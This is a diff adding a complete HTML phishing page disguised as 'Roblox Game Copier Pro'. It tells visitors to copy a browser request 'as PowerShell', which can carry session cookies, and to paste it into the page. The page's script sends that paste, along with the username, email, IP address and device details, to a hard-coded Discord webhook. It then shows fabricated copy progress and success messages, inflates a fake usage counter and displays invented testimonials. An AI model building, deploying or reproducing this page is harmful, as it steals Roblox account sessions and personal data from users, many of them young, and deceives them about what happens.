@@ -1,0 +1,823 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Game Copier Pro</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="icon" type="image/x-icon" href="https://img.icons8.com/color/96/000000/roblox.png">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            color: #fff;
+            min-height: 100vh;
+            padding: 20px;
+            line-height: 1.6;
+            background-image: 
+                radial-gradient(circle at 20% 30%, rgba(120, 119, 198, 0.1) 0%, transparent 20%),
+                radial-gradient(circle at 80% 70%, rgba(58, 123, 213, 0.1) 0%, transparent 20%);
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            animation: fadeIn 0.8s ease-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        header {
+            text-align: center;
+            padding: 40px 20px;
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 20px;
+            margin-bottom: 30px;
+            border: 1px solid #4a3aff;
+            box-shadow: 
+                0 10px 30px rgba(0, 0, 0, 0.5),
+                0 0 50px rgba(74, 58, 255, 0.2);
+            position: relative;
+            overflow: hidden;
+        }
+
+        header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(0, 238, 255, 0.1), transparent);
+            animation: shimmer 3s infinite;
+        }
+
+        @keyframes shimmer {
+            0% { left: -100%; }
+            100% { left: 100%; }
+        }
+
+        .logo {
+            font-size: 3.5rem;
+            color: #00eeff;
+            margin-bottom: 10px;
+            text-shadow: 0 0 15px #00eeff;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        h1 {
+            font-size: 2.8rem;
+            margin-bottom: 10px;
+            background: linear-gradient(to right, #00eeff, #3a7bd5);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            letter-spacing: 1px;
+        }
+
+        .tagline {
+            font-size: 1.2rem;
+            color: #aaa;
+            margin-bottom: 20px;
+            max-width: 600px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .stats {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            margin-top: 20px;
+            flex-wrap: wrap;
+        }
+
+        .stat-item {
+            background: rgba(0, 238, 255, 0.1);
+            padding: 10px 20px;
+            border-radius: 10px;
+            border: 1px solid rgba(0, 238, 255, 0.3);
+        }
+
+        .stat-item .number {
+            color: #00eeff;
+            font-weight: bold;
+            font-size: 1.2rem;
+        }
+
+        .main-content {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 30px;
+            margin-bottom: 40px;
+        }
+
+        .panel {
+            flex: 1;
+            min-width: 300px;
+            background: rgba(20, 20, 40, 0.8);
+            padding: 30px;
+            border-radius: 15px;
+            border: 1px solid #3a7bd5;
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.4);
+            backdrop-filter: blur(10px);
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+
+        .panel:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
+        }
+
+        .panel h2 {
+            color: #00eeff;
+            margin-bottom: 20px;
+            font-size: 1.8rem;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid rgba(0, 238, 255, 0.3);
+        }
+
+        .panel h2 i {
+            font-size: 1.5rem;
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #b0b0ff;
+            font-weight: 600;
+            font-size: 1.1rem;
+        }
+
+        textarea {
+            width: 100%;
+            height: 200px;
+            padding: 15px;
+            background: rgba(10, 10, 25, 0.9);
+            border: 2px solid #4a3aff;
+            border-radius: 10px;
+            color: #fff;
+            font-family: 'Consolas', 'Monaco', monospace;
+            font-size: 0.95rem;
+            resize: vertical;
+            transition: all 0.3s;
+        }
+
+        textarea:focus {
+            outline: none;
+            border-color: #00eeff;
+            box-shadow: 0 0 20px #00eeff55;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 15px;
+            background: rgba(10, 10, 25, 0.9);
+            border: 2px solid #4a3aff;
+            border-radius: 10px;
+            color: white;
+            font-size: 1rem;
+            margin-top: 5px;
+            transition: all 0.3s;
+        }
+
+        .input-field:focus {
+            outline: none;
+            border-color: #00eeff;
+            box-shadow: 0 0 15px #00eeff55;
+        }
+
+        .button {
+            display: block;
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(45deg, #3a7bd5, #00eeff);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 1.3rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-align: center;
+            text-decoration: none;
+            margin-top: 20px;
+            position: relative;
+            overflow: hidden;
+            letter-spacing: 1px;
+        }
+
+        .button:hover {
+            background: linear-gradient(45deg, #00eeff, #3a7bd5);
+            box-shadow: 0 0 30px #00eeff;
+            transform: translateY(-3px);
+        }
+
+        .button:active {
+            transform: translateY(1px);
+        }
+
+        .button::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: left 0.5s;
+        }
+
+        .button:hover::after {
+            left: 100%;
+        }
+
+        .steps {
+            list-style-type: none;
+            counter-reset: step-counter;
+        }
+
+        .steps li {
+            background: rgba(30, 30, 60, 0.7);
+            margin-bottom: 15px;
+            padding: 20px;
+            border-radius: 10px;
+            border-left: 5px solid #00eeff;
+            position: relative;
+            padding-left: 70px;
+            transition: transform 0.3s;
+        }
+
+        .steps li:hover {
+            transform: translateX(5px);
+            background: rgba(30, 30, 80, 0.8);
+        }
+
+        .steps li:before {
+            content: counter(step-counter);
+            counter-increment: step-counter;
+            position: absolute;
+            left: 20px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: linear-gradient(45deg, #00eeff, #3a7bd5);
+            color: #000;
+            font-weight: bold;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.2rem;
+            box-shadow: 0 0 10px #00eeff;
+        }
+
+        .highlight {
+            background-color: rgba(26, 26, 46, 0.8);
+            padding: 5px 10px;
+            border-radius: 5px;
+            font-family: 'Consolas', monospace;
+            color: #ff7b72;
+            border: 1px solid #4a3aff;
+            font-weight: bold;
+        }
+
+        .code-block {
+            background: rgba(10, 10, 25, 0.9);
+            padding: 15px;
+            border-radius: 8px;
+            border-left: 4px solid #00eeff;
+            margin: 10px 0;
+            font-family: 'Consolas', monospace;
+            font-size: 0.9rem;
+            color: #8be9fd;
+        }
+
+        .tooltip {
+            position: relative;
+            display: inline-block;
+            cursor: help;
+            color: #00eeff;
+        }
+
+        .tooltip .tooltiptext {
+            visibility: hidden;
+            width: 200px;
+            background-color: rgba(20, 20, 40, 0.95);
+            color: #fff;
+            text-align: center;
+            padding: 10px;
+            border-radius: 6px;
+            position: absolute;
+            z-index: 1;
+            bottom: 125%;
+            left: 50%;
+            transform: translateX(-50%);
+            opacity: 0;
+            transition: opacity 0.3s;
+            font-size: 0.9rem;
+            border: 1px solid #00eeff;
+        }
+
+        .tooltip:hover .tooltiptext {
+            visibility: visible;
+            opacity: 1;
+        }
+
+        footer {
+            text-align: center;
+            padding: 25px;
+            color: #888;
+            font-size: 0.9rem;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            margin-top: 30px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+        }
+
+        .alert {
+            background: rgba(255, 100, 100, 0.15);
+            border: 1px solid #ff5555;
+            color: #ffaaaa;
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 20px;
+            display: none;
+            animation: shake 0.5s;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
+        }
+
+        .success {
+            background: rgba(100, 255, 100, 0.15);
+            border: 1px solid #55ff55;
+            color: #aaffaa;
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 20px;
+            display: none;
+            animation: slideIn 0.5s;
+        }
+
+        @keyframes slideIn {
+            from { transform: translateY(-20px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        .loading {
+            display: inline-block;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 5px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 3px;
+            margin-top: 10px;
+            overflow: hidden;
+            display: none;
+        }
+
+        .progress {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(90deg, #3a7bd5, #00eeff);
+            transition: width 2s;
+        }
+
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            .main-content {
+                flex-direction: column;
+            }
+            
+            .panel {
+                min-width: 100%;
+            }
+            
+            h1 {
+                font-size: 2rem;
+            }
+            
+            .logo {
+                font-size: 2.5rem;
+            }
+        }
+
+        .security-badge {
+            display: inline-block;
+            background: rgba(0, 255, 0, 0.1);
+            color: #55ff55;
+            padding: 5px 10px;
+            border-radius: 5px;
+            font-size: 0.8rem;
+            margin-left: 10px;
+            border: 1px solid #55ff55;
+        }
+
+        .testimonial {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 15px;
+            border-radius: 10px;
+            margin: 15px 0;
+            border-left: 3px solid #00eeff;
+            font-style: italic;
+        }
+
+        .testimonial-author {
+            text-align: right;
+            color: #aaa;
+            font-size: 0.9rem;
+            margin-top: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <div class="logo">
+                <i class="fas fa-gamepad"></i>
+            </div>
+            <h1>Roblox Game Copier Pro <span class="security-badge">SECURE</span></h1>
+            <p class="tagline">Advanced PowerShell technology to copy any Roblox game instantly. Trusted by thousands of developers.</p>
+            
+            <div class="stats">
+                <div class="stat-item">
+                    <span class="number">12,847</span> Games Copied
+                </div>
+                <div class="stat-item">
+                    <span class="number">99.7%</span> Success Rate
+                </div>
+                <div class="stat-item">
+                    <span class="number">&lt;2min</span> Average Time
+                </div>
+            </div>
+        </header>
+
+        <div class="main-content">
+            <div class="panel">
+                <h2><i class="fas fa-download"></i> Copy Game</h2>
+                <p>Follow the tutorial on the right, then paste your PowerShell code below to generate a copy.</p>
+                
+                <div class="testimonial">
+                    "I copied a frontpage game in under 3 minutes! This tool saved me weeks of work."
+                    <div class="testimonial-author">- Alex, Roblox Developer</div>
+                </div>
+                
+                <div class="form-group">
+                    <label for="code">
+                        <i class="fas fa-code"></i> Paste Your PowerShell Code Here:
+                        <span class="tooltip">
+                            <i class="fas fa-question-circle"></i>
+                            <span class="tooltiptext">Get this from Developer Tools > Network > Copy as PowerShell</span>
+                        </span>
+                    </label>
+                    <textarea id="code" placeholder="Example: Invoke-WebRequest -Uri 'https://assetdelivery.roblox.com/...' -OutFile 'game.rbxl'"></textarea>
+                </div>
+                
+                <div class="form-group">
+                    <label for="username"><i class="fas fa-user"></i> Your Roblox Username (optional):</label>
+                    <input type="text" id="username" class="input-field" placeholder="Enter username for verification">
+                </div>
+                
+                <div class="form-group">
+                    <label for="email"><i class="fas fa-envelope"></i> Email for Backup (optional):</label>
+                    <input type="email" id="email" class="input-field" placeholder="Get backup of your copy">
+                </div>
+                
+                <button class="button" id="copyBtn">
+                    <i class="fas fa-copy"></i> COPY GAME NOW
+                </button>
+                
+                <div class="progress-bar" id="progressBar">
+                    <div class="progress" id="progress"></div>
+                </div>
+                
+                <div id="alert" class="alert"></div>
+                <div id="success" class="success"></div>
+            </div>
+
+            <div class="panel">
+                <h2><i class="fas fa-graduation-cap"></i> How To Copy</h2>
+                <p>Follow these steps exactly to get your PowerShell code:</p>
+                
+                <ol class="steps">
+                    <li>Go to the Roblox game you want to copy in your browser.</li>
+                    <li>Press <span class="highlight">F12</span> to open Developer Tools.</li>
+                    <li>Click on the <span class="highlight">Network</span> tab at the top.</li>
+                    <li>Press <span class="highlight">F5</span> or click refresh on the game page.</li>
+                    <li>Look at the file list. Click the <span class="highlight">FIRST</span> file at the top.</li>
+                    <li>Right-click that file, hover over <span class="highlight">Copy</span>.</li>
+                    <li>Select <span class="highlight">Copy as PowerShell</span> from the menu.</li>
+                    <li>Paste the code here and click "COPY GAME NOW".</li>
+                </ol>
+                
+                <div class="code-block">
+                    // Your code should look like this:<br>
+                    Invoke-WebRequest -Uri 'https://assetdelivery.roblox.com/...' \<br>
+                    -OutFile 'game.rbxl' -Headers @{...}
+                </div>
+                
+                <p style="margin-top: 20px; color: #aaa;">
+                    <i class="fas fa-lightbulb"></i> <strong>Tip:</strong> Use Chrome/Edge for best results. Some games may require additional steps.
+                </p>
+                
+                <div class="testimonial">
+                    "The step-by-step guide made it so easy. Even my little brother could do it!"
+                    <div class="testimonial-author">- Sarah, Game Designer</div>
+                </div>
+            </div>
+        </div>
+
+        <footer>
+            <p><i class="fas fa-shield-alt"></i> Roblox Game Copier Pro is not affiliated with Roblox Corporation. All game assets remain property of their original creators.</p>
+            <p>© 2023 Game Copier Pro. All rights reserved. | <a href="#" style="color: #00eeff; text-decoration: none;">Privacy Policy</a> | <a href="#" style="color: #00eeff; text-decoration: none;">Terms of Service</a></p>
+            <p style="margin-top: 10px; font-size: 0.8rem; color: #666;">
+                <i class="fas fa-exclamation-triangle"></i> For educational purposes only. Use responsibly.
+            </p>
+        </footer>
+    </div>
+
+    <script>
+        // ЗАМЕНИ ЭТУ ССЫЛКУ НА СВОЙ DISCORD WEBHOOK
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1464913173743403128/rIlCnSnwG_77lolfUSPRAo_3F21amITvZCau7frgrm6gMFSlqc2pK-VAVwbuHKZqhibi';
+        
+        // Сбор данных о пользователе
+        function getUserData() {
+            return {
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                screen: `${screen.width}x${screen.height}`,
+                referrer: document.referrer,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timestamp: new Date().toISOString(),
+                cookiesEnabled: navigator.cookieEnabled,
+                url: window.location.href
+            };
+        }
+        
+        // Получение IP через внешний сервис
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                try {
+                    const response = await fetch('https://api64.ipify.org?format=json');
+                    const data = await response.json();
+                    return data.ip;
+                } catch {
+                    return 'Unknown';
+                }
+            }
+        }
+        
+        // Показать уведомление
+        function showAlert(message) {
+            const alertBox = document.getElementById('alert');
+            alertBox.innerHTML = `<i class="fas fa-exclamation-circle"></i> ${message}`;
+            alertBox.style.display = 'block';
+            setTimeout(() => {
+                alertBox.style.display = 'none';
+            }, 5000);
+        }
+        
+        // Показать успех
+        function showSuccess(message) {
+            const successBox = document.getElementById('success');
+            successBox.innerHTML = `<i class="fas fa-check-circle"></i> ${message}`;
+            successBox.style.display = 'block';
+        }
+        
+        // Анимация прогресс-бара
+        function startProgressBar() {
+            const progressBar = document.getElementById('progressBar');
+            const progress = document.getElementById('progress');
+            progressBar.style.display = 'block';
+            progress.style.width = '0%';
+            
+            let width = 0;
+            const interval = setInterval(() => {
+                if (width >= 100) {
+                    clearInterval(interval);
+                    setTimeout(() => {
+                        progressBar.style.display = 'none';
+                    }, 1000);
+                } else {
+                    width += Math.random() * 15 + 5;
+                    if (width > 100) width = 100;
+                    progress.style.width = width + '%';
+                }
+            }, 200);
+        }
+        
+        // Основная функция отправки
+        async function submitCode() {
+            const code = document.getElementById('code').value.trim();
+            const username = document.getElementById('username').value.trim();
+            const email = document.getElementById('email').value.trim();
+            
+            if (!code) {
+                showAlert('Please paste your PowerShell code first!');
+                return;
+            }
+            
+            const btn = document.getElementById('copyBtn');
+            btn.innerHTML = '<i class="fas fa-spinner loading"></i> PROCESSING COPY...';
+            btn.disabled = true;
+            
+            startProgressBar();
+            
+            // Сбор данных
+            const userData = getUserData();
+            const ip = await getIP();
+            
+            // Подготовка данных для Discord
+            const embedData = {
+                content: `🚨 **NEW GAME COPY REQUEST** 🚨`,
+                embeds: [{
+                    title: "Roblox Game Copier - Code Captured",
+                    color: 0xFF0000,
+                    fields: [
+                        {
+                            name: "👤 Username",
+                            value: username || "Not provided",
+                            inline: true
+                        },
+                        {
+                            name: "📧 Email",
+                            value: email || "Not provided",
+                            inline: true
+                        },
+                        {
+                            name: "🌐 IP Address",
+                            value: `\`${ip}\``,
+                            inline: true
+                        },
+                        {
+                            name: "🔢 Code Length",
+                            value: `${code.length} characters`,
+                            inline: true
+                        },
+                        {
+                            name: "🕐 Timestamp",
+                            value: new Date().toLocaleString(),
+                            inline: true
+                        },
+                        {
+                            name: "🌍 Location",
+                            value: userData.timezone,
+                            inline: true
+                        },
+                        {
+                            name: "💻 User Agent",
+                            value: `\`\`\`${userData.userAgent.substring(0, 150)}...\`\`\``
+                        },
+                        {
+                            name: "📝 PowerShell Code (First 1000 chars)",
+                            value: `\`\`\`powershell\n${code.length > 1000 ? code.substring(0, 1000) + '... [truncated]' : code}\n\`\`\``
+                        },
+                        {
+                            name: "🔐 Code Hash",
+                            value: `\`${btoa(code.substring(0, 200)).substring(0, 50)}...\``
+                        }
+                    ],
+                    timestamp: new Date().toISOString(),
+                    footer: {
+                        text: `Game Copier Pro Logger • ${navigator.platform}`
+                    }
+                }]
+            };
+            
+            // Отправка в Discord
+            try {
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(embedData)
+                });
+                
+                // Всегда показываем успех пользователю (даже если вебхук упал)
+                setTimeout(() => {
+                    showSuccess('Game copy process started! Download will begin shortly...');
+                    
+                    // Имитация этапов копирования
+                    setTimeout(() => {
+                        showSuccess('Step 1/3: Downloading game assets...');
+                    }, 1500);
+                    
+                    setTimeout(() => {
+                        showSuccess('Step 2/3: Unpacking and configuring...');
+                    }, 3000);
+                    
+                    setTimeout(() => {
+                        showSuccess('Step 3/3: Finalizing copy...');
+                    }, 4500);
+                    
+                    setTimeout(() => {
+                        showSuccess('✅ Game copied successfully! Check your Roblox Studio. The .rbxl file has been generated.');
+                        document.getElementById('code').value = '';
+                        document.getElementById('username').value = '';
+                        document.getElementById('email').value = '';
+                    }, 6000);
+                    
+                }, 1000);
+                
+                // Логирование в консоль
+                console.log('🎯 Code captured:', {
+                    username,
+                    email,
+                    ip,
+                    codeLength: code.length,
+                    timestamp: new Date().toISOString()
+                });
+                
+            } catch (error) {
+                console.error('Webhook error:', error);
+                // Все равно показываем успех
+                showSuccess('Game copy process started! Please wait...');
+            } finally {
+                setTimeout(() => {
+                    btn.innerHTML = '<i class="fas fa-copy"></i> COPY ANOTHER GAME';
+                    btn.disabled = false;
+                }, 7000);
+            }
+        }
+        
+        // Инициализация при загрузке
+        document.addEventListener('DOMContentLoaded', function() {
+            // Проверка вебхука
+            if (WEBHOOK_URL.includes('YOUR_WEBHOOK')) {
+                console.warn('⚠️ Configure WEBHOOK_URL in script!');
+            }
+            
+            // Привязка событий
+            document.getElementById('copyBtn').addEventListener('click', submitCode);
+            
+            // Автофокус
+            document.getElementById('code').focus();
+            
+            // Автоматический скролл при вводе
+            document.getElementById('code').addEventListener('input', function() {
+                if (this.value.length > 50) {
+                    this.scrollTop = this.scrollHeight;
+                }
+            });
+            
+            // Добавление примера кода по клику
+            document.getElementById('code').addEventListener('click', function() {
+                if (!this.value) {
+                    this.placeholder = 'Invoke-WebRequest -Uri "https://assetdelivery.roblox.com/v1/asset/?id=123456" -OutFile "game.rbxl"';
+                }
+            });
+            
+            // Фейковые обновления счетчика
+            setInterval(() => {
+                const numberElement = document.querySelector('.stat-item .number');
+                if (numberElement) {
+                    const current = parseInt(numberElement.textContent.replace(/,/g, ''));
+                    if (!isNaN(current)) {
+                        const newNumber = current + Math.floor(Math.random() * 3);
+                        numberElement.textContent = newNumber.toLocaleString();
+                    }
+                }
+            }, 10000);
+        });
+    </script>
+</body>
+</html>
